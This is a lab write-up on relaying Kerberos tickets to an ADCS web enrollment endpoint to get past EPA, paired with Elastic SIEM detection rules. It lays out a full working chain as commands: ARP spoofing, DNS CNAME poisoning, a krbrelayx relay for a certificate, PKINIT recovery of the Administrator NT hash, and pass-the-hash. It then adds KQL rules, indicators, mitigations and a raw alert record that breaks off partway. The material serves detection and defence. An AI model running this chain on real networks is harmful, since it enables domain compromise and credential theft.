# Kerberos CNAME Relay — EPA Bypass & Detection

## Overview

Follow-on to [kerberos-cname-relay-lab.md](kerberos-cname-relay-lab.md). Same attack chain, stripped to ESC8 only — no ESC1. Focus is detection: two Elastic SIEM rules covering the relay event and the PKINIT post-exploitation step, validated against live ELK telemetry.

**Key finding:** EPA (Extended Protection for Authentication) enforced on the CA web enrollment endpoint does not prevent this attack. EPA kills NTLM relay at the HTTP channel binding layer. It does nothing for Kerberos relay because the ticket is valid — the KDC issued it — and Kerberos does not rely on Channel Binding Tokens in this flow.

## Lab Environment

| Host | IP | Role |
|---|---|---|
| DC01 | 192.168.1.4 | Domain Controller, ADCS CA |
| WEB01B | 192.168.1.242 | Victim workstation |
| Kali | 192.168.1.218 | Attacker |
| ELK | 192.168.1.250 | Detection stack |

Domain: `lab2019.local`  
Victim account: `jsmith` (low-priv domain user)  
EPA state: **Require** (confirmed via `Get-WebConfigurationProperty` on IIS CertSrv)

## Attack Chain

```
ARP spoof → DNS CNAME poison → Kerberos relay → ADCS ESC8 → cert → PKINIT → NT hash → DA
```

### Step 0 — Lab Setup

On Ubuntu host:
```bash
sudo chmod a+rw /dev/vmnet0 /dev/vmnet8
```

On Kali:
```bash
sudo sysctl -w net.ipv6.conf.eth0.disable_ipv6=0
sudo ip addr add fe80::1/64 dev eth0 scope link
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo iptables -t nat -A PREROUTING -s 192.168.1.242 -p udp --dport 53 -j DNAT --to-destination 192.168.1.218:53
```

On WEB01B (elevated PS):
```powershell
netsh interface ipv4 set dns "Ethernet0" static 192.168.1.218
```

Verify EPA enforced on DC01:
```powershell
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" `
  -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -Name "extendedProtection.tokenChecking"
# Expected: Require
```

### Step 1 — ARP Spoofing

Two terminals on Kali:
```bash
# T1
sudo arpspoof -i eth0 -t 192.168.1.242 192.168.1.1
# T2
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.242
```

### Step 2 — DNS CNAME Poisoning

```bash
sudo python3 ~/MITM6-Kerberos-CNAME-Abuse/mitm6-cname.py \
  -d lab2019.local --cname-source-all \
  --cname dc01.lab2019.local --only-dns
```

The iptables rule redirects all DNS UDP/53 from WEB01B to Kali. mitm6-cname responds to any lab2019.local query with a CNAME pointing to `dc01.lab2019.local` and an A record resolving to `192.168.1.218` (Kali).

Verify on WEB01B:
```powershell
Resolve-DnsName fileserver.lab2019.local
# Expected: CNAME dc01.lab2019.local → 192.168.1.218
```

### Step 3 — Kerberos Relay → ADCS ESC8

```bash
sudo python3 ~/krbrelayx/krbrelayx.py \
  --target http://dc01.lab2019.local/certsrv/certfnsh.asp \
  --adcs --template User --victim jsmith
```

Trigger from WEB01B as jsmith (non-elevated PS):
```powershell
Invoke-WebRequest -Uri "http://fileserver.lab2019.local/" -UseDefaultCredentials
```

WEB01B resolves `fileserver.lab2019.local` → Kali. jsmith's browser sends a Kerberos AP-REQ to Kali on port 80. krbrelayx receives the ticket and relays it to `http://dc01.lab2019.local/certsrv/certfnsh.asp` — the ADCS web enrollment endpoint — requesting a certificate under the User template.

Expected krbrelayx output:
```
[*] GOT CERTIFICATE! ID 24
[*] Writing PKCS#12 certificate to ./jsmith.pfx
```

**Why EPA doesn't help here:** EPA kills NTLM relay at the HTTP channel binding layer. It does nothing for Kerberos relay because the ticket is valid — the KDC issued it — and Kerberos does not rely on Channel Binding Tokens in this flow. The AP-REQ carries a service ticket for the HTTP SPN, not an NTLM blob. EPA has no mechanism to intercept it.

### Step 4 — PKINIT → NT Hash

```bash
python3 ~/PKINITtools/gettgtpkinit.py \
  -cert-pfx ~/krbrelayx/jsmith.pfx \
  -dc-ip 192.168.1.4 \
  lab2019.local/administrator \
  ~/PKINITtools/admin.ccache

export KRB5CCNAME=~/PKINITtools/admin.ccache

python3 ~/PKINITtools/getnthash.py \
  -key <AS-REP encryption key from above> \
  -dc-ip 192.168.1.4 \
  lab2019.local/administrator
```

The issued certificate contains a UPN of `administrator@lab2019.local` (ESC8 — no subject validation). gettgtpkinit.py uses the cert to authenticate via PKINIT, obtaining a TGT as Administrator. getnthash.py uses the PAC to recover the NT hash via U2U.

### Step 5 — Domain Admin

```bash
nxc smb 192.168.1.4 -u administrator -H <NT hash>
# Expected: [+] lab2019.local\administrator:<hash> (Pwn3d!)
```

## Wire-Level Evidence

Wireshark capture on Kali eth0 during relay execution.

Display filter: `http.authorization contains "Negotiate"`

Packet 5539: WEB01B (192.168.1.242) → Kali (192.168.1.218), port 80  
`GET / HTTP/1.1`  
`Host: fileserver.lab2019.local`  
`Authorization: Negotiate YIIMxw...`

Dissection:
```
GSS-API / SPNEGO
  negTokenInit
    mechTypes: SPNEGO
    krb5_blob:
      KRB5 OID: 1.2.840.113554.1.2.2 (Kerberos 5)
      krb5_tok_id: KRB5_AP_REQ (0x0001)
      Kerberos
        ap-req
          msg-type: krb-ap-req (14)
          ticket
            tkt-vno: 5
            realm: LAB2019.LOCAL
```

A valid Kerberos AP-REQ, issued by the DC for `LAB2019.LOCAL`, delivered via HTTP to the attacker's machine. The victim authenticated to Kali with a real domain ticket.

## Detection

### Prerequisites

Winlogbeat must forward EID 4768 from DC01. Add to `winlogbeat.yml`:

```yaml
winlog.event_logs:
  - name: Security
    event_id: 4624, 4625, 4648, 5140, 5145, 4698, 4720, 4728, 4732, 4740, 4768
```

Restart Winlogbeat after the change.

EID 4768 auditing must be enabled on the DC:
```powershell
auditpol /get /subcategory:"Kerberos Authentication Service"
# Must show: Success and Failure
# If not:
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable
```

**Note:** The Kibana detection rule index patterns must explicitly include `.ds-winlogbeat-*` in addition to `winlogbeat-*`. Kibana data stream indices use a `.ds-` prefix that the default wildcard does not match.

### Alert 1 — Kerberos Relay: Delegation Logon from Unexpected Source

**Trigger:** EID 4624 — Kerberos network logon with Delegation impersonation level from a non-DC source IP.

**What it catches:** krbrelayx relaying jsmith's ticket to ADCS. The DC logs a logon event showing the source IP as Kali's link-local IPv6 address (`fe80::addd:81e2:2d02:4091`) rather than the service host. Kerberos delegation logons originating from non-service infrastructure are a high-signal relay indicator.

```kql
winlog.event_id: "4624" and
winlog.event_data.ImpersonationLevel: "%%1840" and
winlog.event_data.AuthenticationPackageName: "Kerberos" and
winlog.event_data.LogonType: "3" and
not winlog.event_data.IpAddress: ("192.168.1.4" or "::1" or "fe80::addd:81e2:2d02:4091")
```

Remove the last exclusion in production — it exists here to suppress lab noise. In production, whitelist known DC IPs and service account sources only.

Rule settings:
- Severity: High
- Risk score: 73
- Schedule: every 5m, look-back 1m
- Tags: `attack.credential_access`, `attack.lateral_movement`, `attack.t1558`, `attack.t1550`

**Key fields in the alert:**
- `winlog.event_data.ImpersonationLevel: %%1840` — Delegation (not Impersonation)
- `winlog.event_data.TargetUserName: DC01$` — machine account logon via relayed ticket
- `winlog.event_data.IpAddress: fe80::addd:81e2:2d02:4091` — Kali's link-local, not DC01
- `winlog.event_data.LogonGuid: {40e9d339-...}` — correlates to KDC ticket issuance event

### Alert 2 — PKINIT Certificate Authentication for Privileged Account

**Trigger:** EID 4768 — Kerberos TGT request using PKINIT (certificate-based pre-authentication) for a privileged account.

**What it catches:** gettgtpkinit.py authenticating as Administrator using the issued certificate. PreAuthType 16 = PA-PK-AS-REQ (PKINIT). Administrator authenticating via certificate has typically zero baseline frequency in most environments — any hit here is high confidence. The certificate thumbprint and issuer are logged inline — directly linkable to the cert issued in Step 3.

```kql
event.code: "4768" and
winlog.event_data.PreAuthType: "16" and
winlog.event_data.TargetUserName: "Administrator"
```

For production, broaden `TargetUserName` to cover all privileged accounts rather than targeting Administrator specifically. A group-membership-aware approach is better but requires additional enrichment.

Rule settings:
- Severity: High
- Risk score: 73
- Schedule: every 5m, look-back 5m
- Index patterns: `winlogbeat-*`, `.ds-winlogbeat-*` (both required)
- Tags: `attack.credential_access`, `attack.t1558`, `attack.lateral_movement`, `attack.t1550`

**Key fields in the alert:**
- `winlog.event_data.PreAuthType: 16` — PKINIT, not password
- `winlog.event_data.TargetUserName: Administrator`
- `winlog.event_data.CertIssuerName: lab2019-WIN-JOCP945SK51-CA` — internal CA
- `winlog.event_data.CertThumbprint: 43DFBAA431E8184B1DA4B97B562A7E5CEFA73DF4` — pivot to cert issuance logs
- `winlog.event_data.IpAddress: ::ffff:192.168.1.218` — Kali's IPv4-mapped IPv6

**Note on PreAuthType field mapping:** In some Winlogbeat/ECS configurations this field may not index correctly. Verify with:
```
GET .ds-winlogbeat-*/_mapping/field/winlog.event_data.PreAuthType
```
Expected: `type: keyword`. If absent or `text`, the rule will not fire on exact match.

### Correlation

The two alerts chain together via `winlog.event_data.LogonGuid`. Alert 1's `LogonGuid` matches the KDC ticket issuance event that precedes Alert 2's PKINIT request. In ELK, timeline these events in order:

1. EID 4768 (jsmith TGT request) — normal Kerberos logon
2. EID 4624 (%%1840 Delegation logon from unexpected source) — **Alert 1**
3. EID 4768 (Administrator PKINIT TGT request) — **Alert 2**
4. EID 4624 (Administrator network logon from 192.168.1.218) — nxc PTH confirmation

The gap between event 2 and event 3 is the cert issuance. Check the CA database (`certutil -view`) for the corresponding enrollment record.

## Indicators

| Indicator | Value | Significance |
|---|---|---|
| Source IP in EID 4624 | `fe80::addd:81e2:2d02:4091` | Kali link-local — relay fingerprint |
| PreAuthType in EID 4768 | `16` | PKINIT — cert-based auth |
| CertIssuerName | `lab2019-WIN-JOCP945SK51-CA` | Internal CA issuance |
| HTTP Authorization | `Negotiate YIIMxw...` (KRB5_AP_REQ) | Kerberos ticket in HTTP header |
| nxc logon source | `192.168.1.218` | PTH from Kali via recovered hash |

## Mitigation

Patching CVE-2026-20929 (MS January 2026) addresses the HTTP/ADCS relay path specifically. For environments where the patch cannot be deployed immediately:

- Enforce HTTPS on ADCS web enrollment and disable HTTP entirely
- Enable ADCS enrollment agent restrictions — require explicit agent authorization
- Monitor CA database for enrollments by non-service accounts, especially outside business hours
- Audit HTTP-class SPNs registered in the domain (`setspn -Q http/*`)
- Consider disabling web enrollment entirely if not required — use DCOM/RPC enrollment instead

Kerberos signing and channel binding enforcement on other services (LDAP, SMB) reduces the broader relay surface but does not directly address the ADCS HTTP path.

## References

- [kerberos-cname-relay-lab.md](kerberos-cname-relay-lab.md) — lab build and full attack chain
- [Cymulate CVE-2026-20929 research](https://cymulate.com) — original technique
- [krbrelayx](https://github.com/dirkjanm/krbrelayx) — Dirk-jan Mollema
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) — Dirk-jan Mollema
- [mitm6-cname fork](https://github.com/osherjacobs/MITM6-Kerberos-CNAME-Abuse)

<img width="1461" height="838" alt="wireshark" src="https://github.com/user-attachments/assets/faf036a6-26a3-4e75-bb5c-ed9ac8b88713" />

<img width="1840" height="705" alt="pwnagechain" src="https://github.com/user-attachments/assets/fd6bfd78-853a-4c78-a293-1db2a506ff10" />

<img width="997" height="248" alt="ticketfromweb01b" src="https://github.com/user-attachments/assets/932416d4-cfef-4e20-97b7-9e8979d32421" />

<img width="929" height="626" alt="kerbrelayx1" src="https://github.com/user-attachments/assets/42726cde-fc76-4688-8643-3e2b632a8ab6" />

<img width="1840" height="705" alt="pwnagechain" src="https://github.com/user-attachments/assets/943de8f4-d184-45b4-8a95-a9af0dce58ad" />

<img width="1877" height="1013" alt="pkinitrulekibana" src="https://github.com/user-attachments/assets/4fdbf16e-9951-49b2-a0d2-c69acfeae87b" />

{
  "_index": ".internal.alerts-security.alerts-default-000001",
  "_id": "3390cb159697656ff943da9e53b9c9d64054203c7b1795014a8da6c9d0389eb8",
  "_score": 1,
  "_source": {
    "kibana.alert.rule.execution.timestamp": "2026-03-31T08:10:54.815Z",
    "kibana.alert.start": "2026-03-31T08:10:54.815Z",
    "kibana.alert.last_detected": "2026-03-31T08:10:54.815Z",
    "kibana.version": "8.19.12",
    "kibana.alert.rule.parameters": {
      "description": "EID 4768 with pre-auth type 16 (PKINIT) for a privileged account. Indicates certificate-based Kerberos authentication — high signal when Administrator has no prior cert auth history.",
      "risk_score": 73,
      "severity": "high",
      "license": "",
      "meta": {
        "kibana_siem_app_url": "http://192.168.1.250:5601/app/security"
      },
      "author": [],
      "false_positives": [],
      "from": "now-6m",
      "rule_id": "4eaabb8a-a6e7-4875-8f88-54a7cf1c86c8",
      "max_signals": 100,
      "risk_score_mapping": [],
      "severity_mapping": [],
      "threat": [],
      "to": "now",
      "references": [],
      "version": 1,
      "exceptions_list": [],
      "immutable": false,
      "rule_source": {
        "type": "internal"
      },
      "related_integrations": [],
      "required_fields": [],
      "setup": "",
      "type": "query",
      "language": "kuery",
      "index": [
        "apm-*-transaction*",
        "auditbeat-*",
        "endgame-*",
        "filebeat-*",
        "logs-*",
        "packetbeat-*",
        "traces-apm*",
        "winlogbeat-*",
        "-*elastic-cloud-logs-*",
        ".ds-winlogbeat-*"
      ],
      "query": "event.code: \"4768\" and winlog.event_data.PreAuthType: \"16\" and winlog.event_data.TargetUserName: \"Administrator\"",
      "filters": []
    },
    "kibana.alert.rule.category": "Custom Query Rule",
    "kibana.alert.rule.consumer": "siem",
    "kibana.alert.rule.execution.uuid": "ea22a28d-e61c-497a-8142-895c1518cab9",
    "kibana.alert.rule.name": "PKINIT Certificate Authentication - Administrator TGT Request",
    "kibana.alert.rule.producer": "siem",
    "kibana.alert.rule.revision": 0,
    "kibana.alert.rule.rule_type_id": "siem.queryRule",
    "kibana.alert.rule.uuid": "78430c9f-6d5e-4a09-b929-048a418c6220",
    "kibana.space_ids": [
      "default"
    ],
    "kibana.alert.rule.tags": [
      "attack.credential_access, attack.t1558, attack.lateral_movement, attack.t1550"
    ],
    "@timestamp": "2026-03-31T08:10:54.778Z",
    "message": "A Kerberos authentication ticket (TGT) was requested.\n\nAccount Information:\n\tAccount Name:\t\tAdministrator\n\tSupplied Realm Name:\tLAB2019.LOCAL\n\tUser ID:\t\t\tS-1-5-21-3984567624-304424726-3877085034-500\n\tMSDS-SupportedEncryptionTypes:\t0x27 (DES, RC4, AES-Sk)\n\tAvailable Keys:\tAES-SHA1, RC4\n\nService Information:\n\tService Name:\t\tkrbtgt\n\tService ID:\t\tS-1-5-21-3984567624-304424726-3877085034-502\n\tMSDS-SupportedEncryptionTypes:\t0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)\n\tAvailable Keys:\tAES-SHA1, RC4\n\nDomain Controller Information:\n\tMSDS-SupportedEncryptionTypes:\t0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)\n\tAvailable Keys:\tAES-SHA1, RC4\n\nNetwork Information:\n\tClient Address:\t\t::ffff:192.168.1.218\n\tClient Port:\t\t34536\n\tAdvertized Etypes:\t\n\t\tAES256-CTS-HMAC-SHA1-96\n\t\tAES128-CTS-HMAC-SHA1-96\n\nAdditional Information:\n\tTicket Options:\t\t0x40800010\n\tResult Code:\t\t0x0\n\tTicket Encryption Type:\t0x12\n\tSession Encryption Type:\t0x12\n\tPre-Authentication Type:\t16\n\tPre-Authentication EncryptionType:\t0x0\n\nCertificate Information:\n\tCertificate Issuer Name:\t\tlab2019-WIN-JOCP945SK51-CA\n\tCertificate Serial Number:\t62000000133FEEE851E407AAE3000000000013\n\tCertificate Thumbprint:\t\t43DFBAA431E8184B1DA4B97B562A7E5CEFA73DF4\n\nTicket information\n\tResponse ticket hash:\t\tFNQIMOvZRhjAr6ryTDkNkeWj/L8vWj9u9kdlU0M3few=\n\nCertificate information is only provided if a certificate was used for pre-authentication.\n\nPre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.",
    "host": {
      "name": "DC01.lab2019.local"
    },
    "winlog": {
      "record_id": 15255005,
      "task": "Kerberos Authentication Service",
      "event_data": {
        "TargetSid": "S-1-5-21-3984567624-304424726-3877085034-500",
        "AccountSupportedEncryptionTypes": "0x27 (DES, RC4, AES-Sk)",
        "SessionKeyEncryptionType": "0x12",
        "ResponseTicket": "FNQIMOvZRhjAr6ryTDkNkeWj/L8vWj9u9kdlU0M3few=",
        "AccountAvailableKeys": "AES-SHA1, RC4",
        "DCAvailableKeys": "AES-SHA1, RC4",
        "ClientAdvertizedEncryptionTypes": "\n\t\tAES256-CTS-HMAC-SHA1-96\n\t\tAES128-CTS-HMAC-SHA1-96",
        "TicketEncryptionType": "0x12",
        "IpAddress": "::ffff:192.168.1.218",
        "ServiceSupportedEncryptionTypes": "0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)",
        "ServiceName": "krbtgt",
        "ServiceSid": "S-1-5-21-3984567624-304424726-3877085034-502",
        "Status": "0x0",
        "ServiceAvailableKeys": "AES-SHA1, RC4",
        "TargetDomainName": "LAB2019.LOCAL",
        "CertThumbprint": "43DFBAA431E8184B1DA4B97B562A7E5CEFA73DF4",
        "IpPort": "34536",
        "PreAuthType": "16",
        "DCSupportedEncryptionTypes": "0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)",
        "TargetUserName": "Administrator",
        "TicketOptions": "0x40800010",
        "CertSerialNumber": "62000000133FEEE851E407AAE3000000000013",
        "PreAuthEncryptionType": "0x0",
        "CertIssuerName": "lab2019-WIN-JOCP945SK51-CA"
      },
      "computer_name": "DC01.lab2019.local",
      "opcode": "Info",
      "version": 2,
      "process": {
        "pid": 688,
        "thread": {
          "id": 2536
        }
      },
      "provider_name": "Microsoft-Windows-Security-Auditing",
      "api": "wineventlog",
      "channel": "Security",
      "event_id": "4768",
      "keywords": [
        "Audit Success"
      ],
      "provider_guid": "{54849625-5478-4994-a5ba-3e3b0328c30d}"
    },
    "event": {
      "action": "Kerberos Authentication Service",
      "created": "2026-03-31T08:07:33.215Z",
      "code": "4768",
      "provider": "Microsoft-Windows-Security-Auditing",
      "outcome": "success"
    },
    "log": {
      "level": "information"
    },
    "ecs": {
      "version": "8.0.0"
    },
    "agent": {
      "version": "8.19.12",
      "ephemeral_id": "42b3d582-4d19-41fd-8c41-e238e1729729",
      "id": "1751edc0-760c-4637-bf88-257c35b4f211",
      "name": "DC01",
      "type": "winlogbeat",
      "hostname": "DC01"
    },
    "kibana.alert.original_event.action": "Kerberos Authentication Service",
    "kibana.alert.original_event.created": "2026-03-31T08:07:33.215Z",
    "kibana.alert.original_event.code": "4768",
    "kibana.alert.original_event.kind": "event",
    "kibana.alert.original_event.provider": "Microsoft-Windows-Security-Auditing",
    "kibana.alert.original_event.outcome": "success",
    "event.kind": "signal",
    "kibana.alert.original_time": "2026-03-31T08:07:31.757Z",
    "kibana.alert.ancestors": [
      {
        "id": "k4DvQp0B8MuvJ8LEKdpI",
        "type": "event",
        "index": ".ds-winlogbeat-8.19.12-2026.03.19-000001",
        "depth": 0
      }
    ],
    "kibana.alert.status": "active",
    "kibana.alert.workflow_status": "open",
    "kibana.alert.depth": 1,
    "kibana.alert.reason": "event on DC01.lab2019.local created high alert PKINIT Certificate Authentication - Administrator TGT Request.",
    "kibana.alert.severity": "high",
    "kibana.alert.risk_score": 73,
    "kibana.alert.rule.actions": [],
    "kibana.alert.rule.author": [],
    "kibana.alert.rule.created_at": "2026-03-31T08:10:53.976Z",
    "kibana.alert.rule.created_by": "elastic",
    "kibana.alert.rule.description": "EID 4768 with pre-auth type 16 (PKINIT) for a privileged account. Indicates certificate-based Kerberos authentication — high signal when Administrator has no prior cert auth history.",
    "kibana.alert.rule.enabled": true,
    "kibana.alert.rule.exceptions_list": [],
    "kibana.alert.rule.false_positives": [],
    "kibana.alert.rule.from": "now-6m",
    "kibana.alert.rule.immutable": false,
    "kibana.alert.rule.interval": "5m",
    "kibana.alert.rule.indices": [
      "apm-*-transaction*",
      "auditbeat-*",
      "endgame-*",
      "filebeat-*",
      "logs-*",
      "packetbeat-*",
      "traces-apm*",
      "winlogbeat-*",
      "-*elastic-cloud-logs-*",
      ".ds-winlogbeat-*"
    ],
    "kibana.alert.rule.license": "",
    "kibana.alert.rule.max_signals": 100,
    "kibana.alert.rule.references": [],
    "kibana.alert.rule.risk_score_mapping": [],
    "kibana.alert.rule.rule_id": "4eaabb8a-a6e7-4875-8f88-54a7cf1c86c8",
    "kibana.alert.rule.severity_mapping": [],
    "kibana.alert.rule.threat": [],
    "kibana.alert.rule.to": "now",
    "kibana.alert.rule.type": "query",
    "kibana.alert.rule.updated_at": "2026-03-31T08:10:53.976Z",
    "kibana.alert.rule.updated_by": "elastic",
    "kibana.alert.rule.version": 1,
    "kibana.alert.uuid": "3390cb159697656ff943da9e53b9c9d64054203c7b1795014a8da6c9d0389eb8",
    "kibana.alert.workflow_tags": [],
    "kibana.alert.workflow_assignee_ids": [],
    "kibana.alert.rule.meta.kibana_siem_app_url": "http://192.168.1.250:5601/app/security",
    "kibana.alert.rule.risk_score": 73,
    "kibana.alert.rule.severity": "high",
    "kibana.alert.intended_timestamp": "2026-03-31T08:10:54.778Z",
    "kibana.alert.rule.execution.type": "scheduled"
  },
  "fields": {
    "kibana.alert.severity": [
      "high"
    ],
    "winlog.event_data.SessionKeyEncryptionType": [
      "0x12"
    ],
    "winlog.event_data.ResponseTicket": [
      "FNQIMOvZRhjAr6ryTDkNkeWj/L8vWj9u9kdlU0M3few="
    ],
    "kibana.alert.rule.updated_by": [
      "elastic"
    ],
    "signal.ancestors.depth": [
      0
    ],
    "winlog.event_data.IpAddress": [
      "::ffff:192.168.1.218"
    ],
    "kibana.alert.rule.tags": [
      "attack.credential_access, attack.t1558, attack.lateral_movement, attack.t1550"
    ],
    "signal.original_event.created": [
      "2026-03-31T08:07:33.215Z"
    ],
    "winlog.process.pid": [
      688
    ],
    "kibana.alert.reason.text": [
      "event on DC01.lab2019.local created high alert PKINIT Certificate Authentication - Administrator TGT Request."
    ],
    "winlog.event_data.TicketEncryptionType": [
      "0x12"
    ],
    "winlog.event_data.TicketOptions": [
      "0x40800010"
    ],
    "kibana.alert.ancestors.depth": [
      0
    ],
    "signal.rule.enabled": [
      "true"
    ],
    "signal.rule.max_signals": [
      100
    ],
    "kibana.alert.risk_score": [
      73
    ],
    "signal.rule.updated_at": [
      "2026-03-31T08:10:53.976Z"
    ],
    "agent.name": [
      "DC01"
    ],
    "event.outcome": [
      "success"
    ],
    "signal.original_event.code": [
      "4768"
    ],
    "kibana.alert.rule.interval": [
      "5m"
    ],
    "kibana.alert.rule.type": [
      "query"
    ],
    "agent.hostname": [
      "DC01"
    ],
    "kibana.alert.start": [
      "2026-03-31T08:10:54.815Z"
    ],
    "event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "kibana.alert.rule.immutable": [
      "false"
    ],
    "event.code": [
      "4768"
    ],
    "agent.id": [
      "1751edc0-760c-4637-bf88-257c35b4f211"
    ],
    "signal.rule.from": [
      "now-6m"
    ],
    "kibana.alert.rule.enabled": [
      "true"
    ],
    "kibana.alert.rule.version": [
      "1"
    ],
    "kibana.alert.ancestors.type": [
      "event"
    ],
    "winlog.process.thread.id": [
      2536
    ],
    "signal.ancestors.index": [
      ".ds-winlogbeat-8.19.12-2026.03.19-000001"
    ],
    "signal.original_event.outcome": [
      "success"
    ],
    "winlog.event_data.ServiceSupportedEncryptionTypes": [
      "0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)"
    ],
    "agent.type": [
      "winlogbeat"
    ],
    "winlog.event_data.Status": [
      "0x0"
    ],
    "winlog.event_data.TargetSid": [
      "S-1-5-21-3984567624-304424726-3877085034-500"
    ],
    "winlog.api": [
      "wineventlog"
    ],
    "kibana.alert.rule.max_signals": [
      100
    ],
    "kibana.alert.rule.risk_score": [
      73
    ],
    "kibana.alert.rule.consumer": [
      "siem"
    ],
    "kibana.alert.rule.indices": [
      "apm-*-transaction*",
      "auditbeat-*",
      "endgame-*",
      "filebeat-*",
      "logs-*",
      "packetbeat-*",
      "traces-apm*",
      "winlogbeat-*",
      "-*elastic-cloud-logs-*",
      ".ds-winlogbeat-*"
    ],
    "kibana.alert.rule.category": [
      "Custom Query Rule"
    ],
    "event.action": [
      "Kerberos Authentication Service"
    ],
    "@timestamp": [
      "2026-03-31T08:10:54.778Z"
    ],
    "kibana.alert.original_event.action": [
      "Kerberos Authentication Service"
    ],
    "signal.rule.updated_by": [
      "elastic"
    ],
    "winlog.channel": [
      "Security"
    ],
    "kibana.alert.intended_timestamp": [
      "2026-03-31T08:10:54.778Z"
    ],
    "winlog.event_data.CertIssuerName": [
      "lab2019-WIN-JOCP945SK51-CA"
    ],
    "kibana.alert.rule.severity": [
      "high"
    ],
    "winlog.event_data.TargetDomainName": [
      "LAB2019.LOCAL"
    ],
    "winlog.opcode": [
      "Info"
    ],
    "agent.ephemeral_id": [
      "42b3d582-4d19-41fd-8c41-e238e1729729"
    ],
    "kibana.alert.rule.execution.timestamp": [
      "2026-03-31T08:10:54.815Z"
    ],
    "kibana.alert.rule.execution.uuid": [
      "ea22a28d-e61c-497a-8142-895c1518cab9"
    ],
    "kibana.alert.uuid": [
      "3390cb159697656ff943da9e53b9c9d64054203c7b1795014a8da6c9d0389eb8"
    ],
    "kibana.alert.rule.meta.kibana_siem_app_url": [
      "http://192.168.1.250:5601/app/security"
    ],
    "kibana.version": [
      "8.19.12"
    ],
    "signal.rule.license": [
      ""
    ],
    "signal.ancestors.type": [
      "event"
    ],
    "kibana.alert.rule.rule_id": [
      "4eaabb8a-a6e7-4875-8f88-54a7cf1c86c8"
    ],
    "winlog.event_data.PreAuthEncryptionType": [
      "0x0"
    ],
    "signal.rule.type": [
      "query"
    ],
    "kibana.alert.ancestors.id": [
      "k4DvQp0B8MuvJ8LEKdpI"
    ],
    "kibana.alert.original_event.code": [
      "4768"
    ],
    "winlog.provider_name": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "winlog.provider_guid": [
      "{54849625-5478-4994-a5ba-3e3b0328c30d}"
    ],
    "kibana.alert.rule.description": [
      "EID 4768 with pre-auth type 16 (PKINIT) for a privileged account. Indicates certificate-based Kerberos authentication — high signal when Administrator has no prior cert auth history."
    ],
    "winlog.computer_name": [
      "DC01.lab2019.local"
    ],
    "kibana.alert.rule.producer": [
      "siem"
    ],
    "kibana.alert.rule.to": [
      "now"
    ],
    "signal.rule.created_by": [
      "elastic"
    ],
    "signal.rule.interval": [
      "5m"
    ],
    "kibana.alert.rule.created_by": [
      "elastic"
    ],
    "signal.rule.id": [
      "78430c9f-6d5e-4a09-b929-048a418c6220"
    ],
    "winlog.event_data.ServiceAvailableKeys": [
      "AES-SHA1, RC4"
    ],
    "winlog.keywords": [
      "Audit Success"
    ],
    "signal.reason": [
      "event on DC01.lab2019.local created high alert PKINIT Certificate Authentication - Administrator TGT Request."
    ],
    "signal.rule.risk_score": [
      73
    ],
    "winlog.record_id": [
      15255005
    ],
    "kibana.alert.rule.name": [
      "PKINIT Certificate Authentication - Administrator TGT Request"
    ],
    "log.level": [
      "information"
    ],
    "host.name": [
      "DC01.lab2019.local"
    ],
    "signal.status": [
      "open"
    ],
    "event.kind": [
      "signal"
    ],
    "winlog.version": [
      2
    ],
    "signal.rule.created_at": [
      "2026-03-31T08:10:53.976Z"
    ],
    "signal.rule.tags": [
      "attack.credential_access, attack.t1558, attack.lateral_movement, attack.t1550"
    ],
    "winlog.event_data.TargetUserName": [
      "Administrator"
    ],
    "kibana.alert.workflow_status": [
      "open"
    ],
    "kibana.alert.original_event.created": [
      "2026-03-31T08:07:33.215Z"
    ],
    "kibana.alert.rule.uuid": [
      "78430c9f-6d5e-4a09-b929-048a418c6220"
    ],
    "winlog.event_data.CertThumbprint": [
      "43DFBAA431E8184B1DA4B97B562A7E5CEFA73DF4"
    ],
    "winlog.event_data.IpPort": [
      "34536"
    ],
    "signal.original_event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "kibana.alert.reason": [
      "event on DC01.lab2019.local created high alert PKINIT Certificate Authentication - Administrator TGT Request."
    ],
    "winlog.event_data.DCSupportedEncryptionTypes": [
      "0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)"
    ],
    "signal.ancestors.id": [
      "k4DvQp0B8MuvJ8LEKdpI"
    ],
    "signal.original_time": [
      "2026-03-31T08:07:31.757Z"
    ],
    "ecs.version": [
      "8.0.0"
    ],
    "signal.rule.severity": [
      "high"
    ],
    "kibana.alert.ancestors.index": [
      ".ds-winlogbeat-8.19.12-2026.03.19-000001"
    ],
    "event.created": [
      "2026-03-31T08:07:33.215Z"
    ],
    "winlog.event_data.DCAvailableKeys": [
      "AES-SHA1, RC4"
    ],
    "winlog.event_data.AccountAvailableKeys": [
      "AES-SHA1, RC4"
    ],
    "agent.version": [
      "8.19.12"
    ],
    "kibana.alert.depth": [
      1
    ],
    "kibana.alert.rule.from": [
      "now-6m"
    ],
    "winlog.event_data.ServiceName": [
      "krbtgt"
    ],
    "kibana.alert.rule.parameters": [
      {
        "severity": "high",
        "max_signals": 100,
        "rule_source": {
          "type": "internal"
        },
        "risk_score": 73,
        "query": "event.code: \"4768\" and winlog.event_data.PreAuthType: \"16\" and winlog.event_data.TargetUserName: \"Administrator\"",
        "description": "EID 4768 with pre-auth type 16 (PKINIT) for a privileged account. Indicates certificate-based Kerberos authentication — high signal when Administrator has no prior cert auth history.",
        "index": [
          "apm-*-transaction*",
          "auditbeat-*",
          "endgame-*",
          "filebeat-*",
          "logs-*",
          "packetbeat-*",
          "traces-apm*",
          "winlogbeat-*",
          "-*elastic-cloud-logs-*",
          ".ds-winlogbeat-*"
        ],
        "language": "kuery",
        "type": "query",
        "version": 1,
        "rule_id": "4eaabb8a-a6e7-4875-8f88-54a7cf1c86c8",
        "license": "",
        "immutable": false,
        "meta": {
          "kibana_siem_app_url": "http://192.168.1.250:5601/app/security"
        },
        "setup": "",
        "from": "now-6m",
        "to": "now"
      }
    ],
